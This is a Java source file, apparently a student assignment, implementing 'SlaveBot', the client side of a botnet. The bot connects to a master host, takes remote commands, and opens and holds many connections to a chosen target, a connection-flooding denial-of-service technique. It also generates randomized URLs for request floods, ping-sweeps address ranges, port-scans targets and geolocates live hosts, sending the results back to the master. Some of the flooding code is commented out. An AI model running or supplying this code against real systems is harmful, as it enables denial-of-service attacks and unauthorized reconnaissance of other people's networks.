/*Created by Mengtong Ma ID: 011483056 */

import java.io.*;
import java.net.*;
import java.util.*;

public class SlaveBot{

	public static void main(String args[]) throws IOException{

		if(args.length == 4 &&
			args[0].equals("-h") &&
			args[2].equals("-p") && 
			Integer.parseInt(args[3]) > 0 && Integer.parseInt(args[3]) < 65536){

			String masterIPOrHostName = args[1];
			int masterPort = Integer.parseInt(args[3]);
			Socket socket = new Socket(masterIPOrHostName, masterPort);
			System.out.println("Connected!!");
			BufferedReader bfrFromMaster = new BufferedReader(new InputStreamReader(socket.getInputStream()));

			while(true){
				String cmdFromMaster = bfrFromMaster.readLine();
				SlaveThread salveThread = new SlaveThread(socket, cmdFromMaster);
				salveThread.start();
			}
		}
		else{

			System.out.println("Usage: SlaveBot -h IPAddress|Hostname -p PortNumber");
		}
	}
}

class connectedSlaveList {
    public static List<Socket> socketList = Collections.synchronizedList(new LinkedList<>());
    public static List<String> ipOrHostList = Collections.synchronizedList(new LinkedList<>());
    public static List<Integer> portList = Collections.synchronizedList(new LinkedList<>());
    // public static ArrayList<String> testIPList = new ArrayList<String>();
    // public static ArrayList<String> repondedIpList = new ArrayList<String>();
    connectedSlaveList() {}
}

class SlaveThread extends Thread{

	private Socket slaveSocket;
	private String cmdFromMaster;
	private String[] command;
	private String targetIPorHost;
	private int targetPort;
	private int numConnection;

	SlaveThread(Socket socket, String cmdFromMaster){
		this.cmdFromMaster = cmdFromMaster;
		slaveSocket = socket;
	}

	public void run(){
		command = cmdFromMaster.split(" ");

		if(command[0].equals("connect")){
			
			targetIPorHost = command[1];
			targetPort = Integer.parseInt(command[2]);
			numConnection = Integer.parseInt(command[3]);
			for(int i = 0; i < numConnection; i++){
				synchronized(connectedSlaveList.socketList){
					try{
						Socket socket = new Socket(targetIPorHost, targetPort);
						connectedSlaveList.socketList.add(socket);
						// connectedSlaveList.ipOrHostList.add(targetIPorHost);
						// connectedSlaveList.portList.add(targetPort);
						System.out.println("Connected to target: " + targetIPorHost + ", target port number: " + targetPort);
						if(cmdFromMaster.contains("keepalive")){
							socket.setKeepAlive(true);
							if(socket.getKeepAlive() == true){
							System.out.println("Set KeepAlive Successfully!!");
							}
						}
						else if(cmdFromMaster.contains("url=")){
							// generate random string
							StringBuilder strbuilder = new StringBuilder();
							int numOfStr = (int)( Math.floor(Math.random() * 10 + 1) );
							for(int j = 0; j < numOfStr; j++){
								int randomChar = (int)(Math.floor(Math.random() * 23 + 1));
								char c = (char) ((int)'a' + randomChar);
								strbuilder.append(c);
							}
							String randomString = strbuilder.toString();
							// String actualURL = command[4].substring(4);
							
							// PrintWriter pw = new PrintWriter(socket.getOutputStream());
				   //       	BufferedReader br=new BufferedReader(new InputStreamReader(socket.getInputStream()));

							String urlString = "";
							if(targetIPorHost.startsWith("http://") && cmdFromMaster.contains("/#q=")){
								urlString = targetIPorHost + "/" + command[4].substring(4) + randomString;
							}
							else if(cmdFromMaster.contains("/#q=")){
								urlString = "http://" + targetIPorHost + command[4].substring(4) + randomString;
							}
							else if(command[4].substring(4).startsWith("/")){
								urlString = "http://" + targetIPorHost + command[4].substring(4) + "/#q=" + randomString;
							}
							else if(cmdFromMaster.contains("/") == false){
								urlString = "http://" + targetIPorHost + "/" + command[4].substring(4) + "/#q=" + randomString;
							}
							// String a="GET /"+actualURL+randomString+" HTTP/1.1"+"\r\n"+"Host: "+targetIPorHost+":"+targetPort+"\r\n"+"Connection: keep-alive"+"\r\n\r\n";
				   //          pw.println(a);
				   //          pw.flush();
				   //     //BufferedReader br=new BufferedReader(new InputStreamReader(socket.getInputStream()));
				   //     String strTemp = "";
				       
				  //      System.out.println(urlString);
				  //      while ( ( strTemp=br.readLine())!=null) {
						// 	//System.out.println(strTemp);
						// }
							
							System.out.println(urlString);

						}

					}catch (UnknownHostException e){
						System.err.println("No route to host.");
						System.exit(-1);
					}catch (IOException e){
						e.printStackTrace();
						System.exit(-1);					
					}
				}
				synchronized(connectedSlaveList.ipOrHostList){
					connectedSlaveList.ipOrHostList.add(targetIPorHost);
				}
				synchronized(connectedSlaveList.portList){
					connectedSlaveList.portList.add(targetPort);
				}
			}
		}
		else if(command[0].equals("disconnect")){
			boolean isDisconnected = false;
			targetIPorHost = command[1];
			if(command[2].equals("all")){
				for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
					if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost)){
						isDisconnected = true;
						synchronized(connectedSlaveList.socketList){
							try{
								connectedSlaveList.socketList.get(i).close();
								connectedSlaveList.socketList.remove(i);
								// connectedSlaveList.ipOrHostList.remove(i);
								// connectedSlaveList.portList.remove(i);
								System.out.println("disconnect " + targetIPorHost);
							}catch (IOException e){
								e.printStackTrace();
								System.exit(-1);
							}
						}
						synchronized(connectedSlaveList.ipOrHostList){
							connectedSlaveList.ipOrHostList.remove(i);
						}
						synchronized(connectedSlaveList.portList){
							connectedSlaveList.portList.remove(i);
						}
					}
					i--;
				}
			}
			else{

				targetPort = Integer.parseInt(command[2]);
				for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
					if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost) && 
						connectedSlaveList.portList.get(i).equals(targetPort)){
						isDisconnected = true;
						synchronized(connectedSlaveList.socketList){
							try{
								connectedSlaveList.socketList.get(i).close();
								connectedSlaveList.socketList.remove(i);
								// connectedSlaveList.ipOrHostList.remove(i);
								// connectedSlaveList.portList.remove(i);
								System.out.println("disconnect " + targetIPorHost + " at port number: " + Integer.toString(targetPort));
							}catch (IOException e){
								e.printStackTrace();
								System.exit(-1);
							}
						}
						synchronized(connectedSlaveList.ipOrHostList){
							connectedSlaveList.ipOrHostList.remove(i);
						}
						synchronized(connectedSlaveList.portList){
							connectedSlaveList.portList.remove(i);
						}
					}
					i--;
					// else{
					// 	System.out.println(targetIPorHost + " at port number " + targetPort + " is already disconnected");
					// }
				}
			}
			if(isDisconnected == false){
				System.out.println(targetIPorHost + " is already disconnected!");
			}

		}
		else if(command[0].equals("ipscan")){
			Thread slaveIpscan = new SlaveIpScanThread(slaveSocket, cmdFromMaster);
			slaveIpscan.start();
		}
		else if(command[0].equals("tcpportscan")){
			Thread slaveportscan = new SlavePortScanThread(slaveSocket, cmdFromMaster);
			slaveportscan.start();
		}
		else if(command[0].equals("geoipscan")){
			Thread slavegeoipscan = new SlaveGeoIpScanThread(slaveSocket, cmdFromMaster);
			slavegeoipscan.start();
		}

	}
}

class SlaveIpScanThread extends Thread{
	String input;
	Socket slaveSocket;
	SlaveIpScanThread(Socket slaveSocket, String cmdFromMaster){
		input = cmdFromMaster;
		this.slaveSocket = slaveSocket;
	}
	public void run(){
		String[] command = input.split(" ");
		try{
				int ipRange = Integer.parseInt(command[2]);
				String ipAddr = InetAddress.getByName(command[1]).getHostAddress();
				int dotIndex = ipAddr.lastIndexOf(".");
				String unchangeIp = ipAddr.substring(0, dotIndex + 1);
				int change = Integer.parseInt(ipAddr.substring(dotIndex + 1));
				
				OutputStream outPutStrm = slaveSocket.getOutputStream();
				PrintWriter printW = new PrintWriter(outPutStrm, true);
				
				ArrayList<String> testIPList = new ArrayList<String>();
				testIPList.add(ipAddr);
				for(int i = 1; i < ipRange; i++){
					String testIp = unchangeIp + Integer.toString(change + i);
					testIPList.add(testIp);
				}
				//ArrayList<String> repondedIpList = new ArrayList<String>();
				String printIpList = "";
				for(String allIp : testIPList){
					String osName = System.getProperties().getProperty("os.name");
					Process process = null;
					if(osName.startsWith("Windows")){
						process = Runtime.getRuntime().exec("ping -n 2 -w 5000 " + allIp);
					}
					else if(osName.contains("OS") || osName.startsWith("Linux")){
						process = Runtime.getRuntime().exec("ping -c 2 -W 5000 " + allIp);
					}
					//process = Runtime.getRuntime().exec("ping -c 2 -W 5000 " + allIp);
					InputStreamReader r = new InputStreamReader(process.getInputStream());
					LineNumberReader returnData = new LineNumberReader(r);
					
					String returnMsg = "";
					String line = "";
					while((line = returnData.readLine()) != null){
						returnMsg += line;
					}
					// OutputStream outPutStrm = slaveSocket.getOutputStream();
					// PrintWriter printW = new PrintWriter(outPutStrm, true);
					if(returnMsg.indexOf("100.0% packet loss") == -1){
						//System.out.println(allIp);
						//repondedIpList.add(allIp);
						printIpList += allIp + ",";
					}
				}
				int strLength = printIpList.length();
				
				if(strLength != 0){
					printIpList = printIpList.substring(0, strLength - 1);
				}
				
				printIpList += "\r";
				printW.write(printIpList);
				printW.flush();
				// for(String respondIp : repondedIpList){
					
				// 	OutputStream outPutStrm = slaveSocket.getOutputStream();
				// 	PrintWriter printW = new PrintWriter(outPutStrm, true);

				// 	//System.out.println(respondIp);

				// }

			}catch (UnknownHostException e){
				//System.err.println("No route to host.");
				//System.exit(-1);
			}catch (IOException e){
				//e.printStackTrace();
			}
    }
}

//tcp port scan
	class SlavePortScanThread extends Thread{
		String input;
		Socket slaveSocket;
		SlavePortScanThread(Socket slaveSocket, String cmdFromMaster){
			input = cmdFromMaster;
			this.slaveSocket = slaveSocket;		
		}

		public void run(){
			String[] command = input.split(" ");
			
			//try{
				//InetAddress address = InetAddress.getByName(command[1]);
				String address = command[1];
				int low = Integer.parseInt(command[2]);
				int high = Integer.parseInt(command[3]);
				
				String portList = "";

				try{

					OutputStream outputToMaster = slaveSocket.getOutputStream();
					PrintWriter printToMaster = new PrintWriter(outputToMaster, true);
					
					for(int j = low; j <= high; j++){
					try{
						
						Socket testSocket = new Socket();
						testSocket.connect(new InetSocketAddress(address, j), 5000);
						
						testSocket.close();
						portList += Integer.toString(j) + ",";
					}catch (Exception e){}
				}
					int listLength = portList.length();
					if(listLength != 0){
						portList = portList.substring(0, listLength - 1);
					}				
					portList += "\r";
					printToMaster.write(portList);
					printToMaster.flush();
				}catch (IOException e){}

			// }catch (IOException e) {
			// 	//e.printStackTrace();
			// }

		}

	}

	//geolocation ip scan
	class SlaveGeoIpScanThread extends Thread{
		String input;
		Socket slaveSocket;
		SlaveGeoIpScanThread(Socket slaveSocket, String cmdFromMaster){
			input = cmdFromMaster;
			this.slaveSocket = slaveSocket;	
		}

		public void run(){
			String[] command = input.split(" ");
			int startIndex = command[1].lastIndexOf(".");
			int endIndex = command[2].lastIndexOf(".");
			String fixedIp = command[1].substring(0, startIndex + 1);
			int start = Integer.parseInt(command[1].substring(startIndex + 1));
			int end = Integer.parseInt(command[2].substring(endIndex + 1));
			
			try{				
				//StringBuilder geoLocation = new StringBuilder();
				String geoLocation = "";
				
				OutputStream outPutStrm = slaveSocket.getOutputStream();
				PrintWriter printW = new PrintWriter(outPutStrm, true);
				//printW.println("hello");
		
				ArrayList<String> ping = new ArrayList<String>();
				// store replied ip address to ArrayList ping
				for(int i = start; i <= end; i++){
					String pingIp = fixedIp + Integer.toString(i);
					String osName = System.getProperties().getProperty("os.name");
					Process process = null;
					if(osName.startsWith("Windows")){
						process = Runtime.getRuntime().exec("ping -n 2 -w 5000 " + pingIp);
					}
					else if(osName.contains("OS") || osName.startsWith("Linux")){
						process = Runtime.getRuntime().exec("ping -c 2 -W 5000 " + pingIp);
					}
					InputStreamReader r = new InputStreamReader(process.getInputStream());
					LineNumberReader returnData = new LineNumberReader(r);
					
					String returnMsg = "";
					String line = "";
					while((line = returnData.readLine()) != null){
						returnMsg += line;
					}
					if(returnMsg.indexOf("100.0% packet loss") == -1){
						ping.add(pingIp);
						//System.out.println(pingIp);
						//geoLocation += pingIp;
					}
				}
				// get geo locatio information from database
				for(String address : ping){
						
						String geoTest = "http://freegeoip.net/xml/" + address;
						//System.out.println(geoTest);
						URL geoWebsite = new URL(geoTest);
						BufferedReader in = new BufferedReader(new InputStreamReader(geoWebsite.openStream()));
						String inputLine = "";
						
						//geoLocation.append(address);
						geoLocation += address;
						while((inputLine = in.readLine()) != null){
							if(inputLine.contains("CountryName")){
								int findIp = inputLine.lastIndexOf("<");
								String countryInfo = inputLine.substring(0, findIp);
								//geoLocation.append(countryInfo);
								geoLocation += countryInfo;

							}
							if(inputLine.contains("City")){
								int city = inputLine.lastIndexOf("<");
								String cityInfo = inputLine.substring(0, city);
								//geoLocation.append(cityInfo);
								//geoLocation.append("\n");
								geoLocation += cityInfo;
								geoLocation += ";";
							}
						}
						in.close();					
					}
					if(geoLocation.length() != 0){

						geoLocation = geoLocation.substring(0, geoLocation.length() - 1);
						
					}
				geoLocation += "\r";
				printW.println(geoLocation);
				//geoLocation.append("\r");
				//geoLocation += "\r";
				//System.out.println(geoLocation);
			}catch(Exception e){
				
			}
		}

	}





